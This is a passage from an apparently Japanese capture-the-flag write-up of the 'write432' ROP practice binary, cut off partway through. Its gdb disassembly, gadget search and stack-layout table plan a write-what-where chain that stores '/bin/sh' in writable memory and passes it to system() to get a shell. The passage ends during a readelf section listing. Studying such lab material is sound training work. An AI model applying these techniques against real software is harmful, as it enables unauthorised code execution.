   0x08048641 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048410 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;fgets@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x08048646 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x08048649 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    nop
   0x0804864a &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    leave  
   0x0804864b &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    ret    
End of assembler dump.
&lt;/pre&gt;


&lt;p&gt;次にusefulFunctionを見る。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;Dump of assembler code &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; function usefulFunction:
   0x0804864c &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     push   ebp
   0x0804864d &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     mov    ebp,esp
   0x0804864f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     sub    esp,0x8
   0x08048652 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     sub    esp,0xc
   0x08048655 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     push   0x8048754
   0x0804865a &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    call   0x8048430 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;system@plt&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;
   0x0804865f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    add    esp,0x10
   0x08048662 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    nop
   0x08048663 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    leave  
   0x08048664 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    ret    
End of assembler dump.
gdb-peda$ x/s 0x8048754
0x8048754:      &lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;/bin/ls&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;
gdb-peda$ 
&lt;/pre&gt;


&lt;p&gt;systemを呼び出しているが、その引数は&lt;code&gt;/bin/ls&lt;/code&gt;となっており、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bash&quot;&gt;bash&lt;/a&gt;を起動するには一工夫必要そうだ。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;gdb-peda$ pdisas usefulGadgets
Dump of assembler code &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt; function usefulGadgets:
   0x08048670 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     mov    DWORD PTR &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;edi&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;,ebp
   0x08048672 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     ret    
   0x08048673 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     xchg   ax,ax
   0x08048675 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     xchg   ax,ax
   0x08048677 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     xchg   ax,ax
   0x08048679 &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:     xchg   ax,ax
   0x0804867b &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    xchg   ax,ax
   0x0804867d &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    xchg   ax,ax
   0x0804867f &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:    nop
End of assembler dump.
gdb-peda$ 
&lt;/pre&gt;


&lt;p&gt;usefulGadgetsの&lt;code&gt;mov DWORD PTR [edi],ebp; ret&lt;/code&gt;というガジェットが使えることがわかる。&lt;br&gt;
これはediの指すメモリアドレスに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;の値をコピーする命令となっていて、これを使ってwritableなメモリ領域に&lt;code&gt;/bin/sh&lt;/code&gt;と書き込み、systemの引数として&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bash&quot;&gt;bash&lt;/a&gt;の起動をすることを目指す。&lt;/p&gt;

&lt;p&gt;そのためには&lt;code&gt;pop edi&lt;/code&gt; &lt;code&gt;pop ebp&lt;/code&gt;などのstackからedi、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;を操作する命令群がほしい。
これらを&lt;code&gt;ropgadget&lt;/code&gt;コマンドで探してみる。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;gdb-peda$ &lt;span class=&quot;synStatement&quot;&gt;start&lt;/span&gt;
gdb-peda$ ropgadget
ret &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x804819d
popret &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80483e1
pop2ret &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80486da
pop3ret &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80486d9
pop4ret &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80486d8
addesp_12 &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80483de
addesp_16 &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; 0x80484e5
gdb-peda$ x/3i 0x80486da
   0x80486da &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;__libc_csu_init+&lt;span class=&quot;synConstant&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:      pop    edi
   0x80486db &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;__libc_csu_init+&lt;span class=&quot;synConstant&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:      pop    ebp
   0x80486dc &lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;__libc_csu_init+&lt;span class=&quot;synConstant&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;:      ret    
gdb-peda$ 
&lt;/pre&gt;


&lt;p&gt;ちょうどpop2retでedi、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;に値をpopできるのでこれを使う。&lt;/p&gt;

&lt;p&gt;以下のスタックの状態を考えてみる。&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left;&quot;&gt;Low (↑stack &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/growth&quot;&gt;growth&lt;/a&gt;)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;pop edi;pop &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;;ret (=1番目の戻り先)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;書き込みたいアドレス (→edi)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/value&quot;&gt;value&lt;/a&gt;　(4bit) (→&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;mov [edi],&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/ebp&quot;&gt;ebp&lt;/a&gt;;ret (=2番目の戻り先)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;3番目の戻り先&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;High&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;p&gt;3番目の戻り先に再び&lt;code&gt;pop edi;pop ebp;ret&lt;/code&gt;を接続することで、任意のメモリアドレスに任意の値の書き込みが可能になる。
次に&lt;code&gt;/bin/sh&lt;/code&gt;を書き込むこむことができるセクションを探してみる。&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ readelf &lt;span class=&quot;synSpecial&quot;&gt;-S&lt;/span&gt; write432
There are &lt;span class=&quot;synConstant&quot;&gt;31&lt;/span&gt; section headers, starting at offset 0x196c:

セクションヘッダ:
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;番&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; 名前              タイプ          アドレス Off    サイズ ES Flg Lk Inf Al
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt;                   NULL            &lt;span class=&quot;synConstant&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;      &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .interp           PROGBITS        &lt;span class=&quot;synConstant&quot;&gt;08048154&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000154&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000013&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .note.ABI-tag     NOTE            &lt;span class=&quot;synConstant&quot;&gt;08048168&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000168&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000020&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .note.gnu.build-i NOTE            &lt;span class=&quot;synConstant&quot;&gt;08048188&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000188&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000024&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .gnu.&lt;span class=&quot;synStatement&quot;&gt;hash&lt;/span&gt;         GNU_HASH        080481ac 0001ac &lt;span class=&quot;synConstant&quot;&gt;000030&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;04&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .dynsym           DYNSYM          080481dc 0001dc 0000d0 &lt;span class=&quot;synConstant&quot;&gt;10&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .dynstr           STRTAB          080482ac 0002ac &lt;span class=&quot;synConstant&quot;&gt;000081&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .gnu.version      VERSYM          0804832e 00032e 00001a &lt;span class=&quot;synConstant&quot;&gt;02&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .gnu.version_r    VERNEED         &lt;span class=&quot;synConstant&quot;&gt;08048348&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000348&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000020&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .rel.dyn          REL             &lt;span class=&quot;synConstant&quot;&gt;08048368&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000368&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000020&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;08&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .rel.plt          REL             &lt;span class=&quot;synConstant&quot;&gt;08048388&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000388&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000038&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;08&lt;/span&gt;  AI  &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;24&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .init             PROGBITS        080483c0 0003c0 &lt;span class=&quot;synConstant&quot;&gt;000023&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  AX  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .plt              PROGBITS        080483f0 0003f0 &lt;span class=&quot;synConstant&quot;&gt;000080&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;04&lt;/span&gt;  AX  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .plt.got          PROGBITS        &lt;span class=&quot;synConstant&quot;&gt;08048470&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000470&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000008&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  AX  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;8&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .text             PROGBITS        &lt;span class=&quot;synConstant&quot;&gt;08048480&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000480&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000262&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  AX  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .fini             PROGBITS        080486e4 0006e4 &lt;span class=&quot;synConstant&quot;&gt;000014&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  AX  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .rodata           PROGBITS        080486f8 0006f8 &lt;span class=&quot;synConstant&quot;&gt;000064&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .eh_frame         PROGBITS        &lt;span class=&quot;synConstant&quot;&gt;08048798&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000798&lt;/span&gt; 00010c &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;   A  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .init_array       INIT_ARRAY      08049f08 000f08 &lt;span class=&quot;synConstant&quot;&gt;000004&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .fini_array       FINI_ARRAY      08049f0c 000f0c &lt;span class=&quot;synConstant&quot;&gt;000004&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .jcr              PROGBITS        08049f10 000f10 &lt;span class=&quot;synConstant&quot;&gt;000004&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .dynamic          DYNAMIC         08049f14 000f14 0000e8 &lt;span class=&quot;synConstant&quot;&gt;08&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;6&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .got              PROGBITS        08049ffc 000ffc &lt;span class=&quot;synConstant&quot;&gt;000004&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;04&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
